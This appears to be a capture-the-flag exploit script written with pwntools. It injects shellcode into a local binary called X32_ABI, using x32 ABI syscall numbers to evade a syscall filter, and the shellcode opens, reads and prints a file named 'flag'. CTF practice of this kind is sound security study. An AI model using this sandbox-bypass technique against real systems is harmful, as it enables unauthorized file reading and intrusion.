from pwn import *
context.arch = 'amd64'

p = process('./X32_ABI')

sc = asm(
    '''
    jmp filename
    start:
    //open
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2+0x40000000
    syscall

    //read
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    mov rax, 0+0x40000000
    syscall

    //write
    mov rdi, 1
    mov rax, 1+0x40000000
    syscall

    //exit
    mov rax, 60
    syscall

    filename:
    call start
    .ascii "flag"
    .byte 0
    '''
)
p.sendafter('shellcode:', sc)

p.interactive()